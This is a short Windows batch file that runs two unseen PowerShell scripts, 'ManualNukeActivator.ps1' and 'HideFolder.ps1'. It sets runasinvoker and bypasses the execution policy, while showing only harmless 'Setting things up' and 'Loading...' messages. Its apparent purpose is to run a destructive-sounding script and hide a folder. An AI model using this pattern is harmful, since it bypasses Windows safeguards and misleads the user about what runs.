@echo off

set __compat_layer=runasinvoker

echo Setting things up:

Powershell.exe -executionpolicy bypass -f "ManualNukeActivator.ps1"

timeout 2 > nul

echo Loading...

Powershell.exe -executionpolicy bypass -f "HideFolder.ps1"

echo DONE.

timeout 1 > nul

exit